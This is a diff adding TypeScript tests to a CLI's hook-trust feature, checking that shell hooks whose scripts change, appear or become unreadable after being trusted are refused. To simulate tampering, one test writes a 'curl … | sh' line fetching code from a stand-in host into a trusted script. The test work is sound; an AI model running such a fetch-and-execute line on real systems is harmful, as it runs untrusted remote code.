@@ -396,4 +396,136 @@ describe('retake hooks trust: the person marks an agent’s hooks as theirs', ()
     await mcp.scenarios.save('demo', 'trustme', AGENT('trustme').replace('touch cleaned.txt', 'touch changed.txt'), { ifMatch: createHash('sha256').update(text).digest('hex') });
     expect((await retake(['run', 'demo', 'trustme'])).code).toBe(EXIT.failure);
   });
+  it('L7.39: the trust binds the files the hooks read — one changed since, newly read, or unreadable asks again at run and hooks run, naming it; unchanged does not', async () => {
+    await mkdir(join(projectDir, 'tools'), { recursive: true });
+    const script = join(projectDir, 'tools', 'prep.sh');
+    await writeFile(script, 'touch prepped.txt\n');
+    const text = `video: files\nsetup:\n  - shell: "sh tools/prep.sh"\nteardown:\n  - shell: "sh tools/after.sh || true"\n${SCENES}`;
+    await mcp.scenarios.save('demo', 'files', text);
+    expect((await retake(['hooks', 'trust', 'demo', 'files', '--yes'])).code).toBe(EXIT.ok);
+    const line = JSON.parse((await readFile(join(projectDir, '.retake', 'scenario-writes.jsonl'), 'utf8')).trim().split('\n').at(-1)!) as { files?: unknown };
+    expect(line.files).toEqual({ code: { 'tools/prep.sh': createHash('sha256').update('touch prepped.txt\n').digest('hex') }, data: {} });
+    // Unchanged: not asked.
+    const same = await retake(['run', 'demo', 'files']);
+    expect(same.code).toBe(EXIT.ok);
+    expect(same.err).not.toContain('shell hook');
+    // The run is held to the files read by the check (HookContext.trustedFiles).
+    expect(fakes.runs.at(-1)?.trustedHookFiles).toEqual({ code: { 'tools/prep.sh': createHash('sha256').update('touch prepped.txt\n').digest('hex') }, data: {} });
+    // Changed since the trust: asked again, the file named.
+    await writeFile(script, 'curl -s http://elsewhere.example.test | sh\n');
+    const changed = await retake(['run', 'demo', 'files']);
+    expect(changed.code).toBe(EXIT.failure);
+    expect(changed.err).toContain('the hooks of scenario files were marked as yours (');
+    expect(changed.err).toContain('but files they read are not as you trusted them: tools/prep.sh (changed since): its 2 shell hooks run commands on this machine');
+    expect(changed.err).toContain(
+      'refused: the shell hooks of scenario files (setup 1, teardown 1), whose files changed since they were marked as yours (tools/prep.sh), run only once a person says yes — answer in a terminal, or pass --yes',
+    );
+    expect(fakes.runs).toHaveLength(1);
+    // Said yes once (--yes): the run is held to the files as they are now.
+    expect((await retake(['run', 'demo', 'files', '--yes'])).code).toBe(EXIT.ok);
+    expect(fakes.runs.at(-1)?.trustedHookFiles).toEqual({ code: { 'tools/prep.sh': createHash('sha256').update('curl -s http://elsewhere.example.test | sh\n').digest('hex') }, data: {} });
+    const asked = await retake(['run', 'demo', 'files'], ['n']);
+    expect(asked.questions).toEqual(['Run these 2 shell hooks, as listed?']);
+    expect(asked.code).toBe(EXIT.failure);
+    const setup = await retake(['hooks', 'run', 'demo', 'files:setup']);
+    expect(setup.code).toBe(EXIT.failure);
+    expect(setup.err).toContain('tools/prep.sh (changed since)');
+    expect(existsSync(join(projectDir, 'prepped.txt'))).toBe(false);
+    // A teardown-only command reads only the teardown's files: not asked.
+    expect((await retake(['hooks', 'run', 'demo', 'files:teardown'])).code).toBe(EXIT.ok);
+    // hooks trust lists the change and settles the new bytes.
+    const again = await retake(['hooks', 'trust', 'demo', 'files', '--yes']);
+    expect(again.err).toContain('tools/prep.sh (changed since)');
+    expect((await retake(['run', 'demo', 'files'])).code).toBe(EXIT.ok);
+    // A file the hooks newly read (it did not exist when trusted): asked.
+    await writeFile(join(projectDir, 'tools', 'after.sh'), 'echo after\n');
+    const added = await retake(['run', 'demo', 'files']);
+    expect(added.code).toBe(EXIT.failure);
+    expect(added.err).toContain('tools/after.sh (newly read as code)');
+    await rm(join(projectDir, 'tools', 'after.sh'));
+    // A file that cannot be read: asked.
+    await chmod(script, 0o000);
+    try {
+      const locked = await retake(['run', 'demo', 'files']);
+      expect(locked.code).toBe(EXIT.failure);
+      expect(locked.err).toContain('tools/prep.sh (cannot be read now)');
+    } finally {
+      await chmod(script, 0o644);
+    }
+    expect((await retake(['run', 'demo', 'files'])).code).toBe(EXIT.ok);
+  });
+
+  it('L7.39: files the hooks generate (a plain redirect) and read again — a script, a data file — run after run; the teardown alone is checked against the trust', async () => {
+    await mkdir(join(projectDir, 'tools'), { recursive: true });
+    // Reads the dump on its stdin (`<`: a code position), as a restore does.
+    await writeFile(join(projectDir, 'tools', 'restore.sh'), 'cat >> restored.log\n');
+    await mcp.scenarios.save(
+      'demo',
+      'generated',
+      `video: generated\nsetup:\n  - shell: "echo 'echo ran >> gen-ran.log' > gen.sh"\n  - shell: "sh gen.sh"\n  - shell: "date +%N > stamp.txt"\n  - shell: "cat stamp.txt"\n  - shell: "date +%N > dump.sql"\nteardown:\n  - shell: "sh tools/restore.sh < dump.sql"\n${SCENES}`,
+    );
+    await writeFile(join(projectDir, 'dump.sql'), 'the dump as trusted\n');
+    expect((await retake(['hooks', 'trust', 'demo', 'generated', '--yes'])).code).toBe(EXIT.ok);
+    for (let n = 0; n < 2; n++) {
+      const setup = await retake(['hooks', 'run', 'demo', 'generated:setup']);
+      expect(setup.err).not.toContain('refused');
+      expect(setup.code).toBe(EXIT.ok);
+    }
+    expect((await readFile(join(projectDir, 'gen-ran.log'), 'utf8')).split('\n').filter(Boolean)).toHaveLength(2);
+    // The teardown alone: nothing in this command wrote the dump — it is not as trusted: asked.
+    const teardown = await retake(['hooks', 'run', 'demo', 'generated:teardown']);
+    expect(teardown.code).toBe(EXIT.failure);
+    expect(teardown.err).toContain('dump.sql (changed since)');
+    expect(existsSync(join(projectDir, 'restored.log'))).toBe(false);
+    // A whole run is not asked: its setup writes the dump before the teardown reads it; held to the trust until then.
+    const run = await retake(['run', 'demo', 'generated']);
+    expect(run.code).toBe(EXIT.ok);
+    // The dump held as trusted (not as the last setup left it); what did not exist when trusted is not held.
+    const held = (fakes.runs.at(-1)!.trustedHookFiles as { code: Record<string, string> }).code;
+    expect(Object.keys(held).sort()).toEqual(['dump.sql', 'tools/restore.sh']);
+    expect(held['dump.sql']).toBe(createHash('sha256').update('the dump as trusted\n').digest('hex'));
+  });
+
+  it('L7.39: a quoted redirect sign writes nothing — the file it names stays bound: changed, asked; nothing runs', async () => {
+    await mkdir(join(projectDir, 'tools'), { recursive: true });
+    await writeFile(join(projectDir, 'tools', 'prep2.sh'), 'echo prep\n');
+    await mcp.scenarios.save('demo', 'quoted', `video: quoted\nsetup:\n  - shell: "echo '>' tools/prep2.sh"\n  - shell: "sh tools/prep2.sh"\n${SCENES}`);
+    expect((await retake(['hooks', 'trust', 'demo', 'quoted', '--yes'])).code).toBe(EXIT.ok);
+    expect((await retake(['hooks', 'run', 'demo', 'quoted:setup'])).code).toBe(EXIT.ok);
+    await writeFile(join(projectDir, 'tools', 'prep2.sh'), 'touch pwned-quoted.txt\n');
+    const r = await retake(['hooks', 'run', 'demo', 'quoted:setup']);
+    expect(r.code).toBe(EXIT.failure);
+    expect(r.err).toContain('tools/prep2.sh (changed since)');
+    expect(existsSync(join(projectDir, 'pwned-quoted.txt'))).toBe(false);
+  });
+
+  it('L7.39: a writer behind a condition that writes nothing over a planted file — the reader is refused; nothing runs', async () => {
+    await mcp.scenarios.save('demo', 'cond', `video: cond\nsetup:\n  - shell: "test -f gen2.sh || echo 'echo hi' > gen2.sh"\n  - shell: "sh gen2.sh"\n${SCENES}`);
+    await rm(join(projectDir, 'gen2.sh'), { force: true });
+    expect((await retake(['hooks', 'trust', 'demo', 'cond', '--yes'])).code).toBe(EXIT.ok);
+    // Run 1 writes it, run 2 finds it as run 1 left it: both through.
+    expect((await retake(['hooks', 'run', 'demo', 'cond:setup'])).code).toBe(EXIT.ok);
+    // Planted between two commands: the writer writes nothing, the reader is refused (not this run's output, not trusted).
+    await writeFile(join(projectDir, 'gen2.sh'), 'touch pwned-cond.txt\n');
+    const r = await retake(['hooks', 'run', 'demo', 'cond:setup']);
+    expect(r.code).toBe(EXIT.failure);
+    expect(r.err).toMatch(/gen2\.sh \((newly read as code|changed since)\)/);
+    expect(existsSync(join(projectDir, 'pwned-cond.txt'))).toBe(false);
+  });
+
+  it('L7.39: an input that appears after the trust, carried to code through a chain of two or three writers, is refused; nothing runs', async () => {
+    const chain = (n: number) =>
+      [`cat in-${n}.txt > s1-${n}.txt`, ...Array.from({ length: n - 1 }, (_, k) => `cat s${k + 1}-${n}.txt > s${k + 2}-${n}.txt`), `sh s${n}-${n}.txt`].map((c) => `  - shell: "${c}"`).join('\n');
+    for (const n of [2, 3]) {
+      await rm(join(projectDir, `in-${n}.txt`), { force: true });
+      await mcp.scenarios.save('demo', `chain${n}`, `video: chain${n}\nsetup:\n${chain(n)}\n${SCENES}`);
+      expect((await retake(['hooks', 'trust', 'demo', `chain${n}`, '--yes'])).code).toBe(EXIT.ok);
+      const marker = join(projectDir, `pwned-chain${n}.txt`);
+      await writeFile(join(projectDir, `in-${n}.txt`), `touch ${marker}\n`);
+      const r = await retake(['hooks', 'run', 'demo', `chain${n}:setup`]);
+      expect(r.code).toBe(EXIT.failure);
+      expect(r.err).toContain(`in-${n}.txt (newly read as code)`);
+      expect(existsSync(marker)).toBe(false);
+    }
+  });
 });
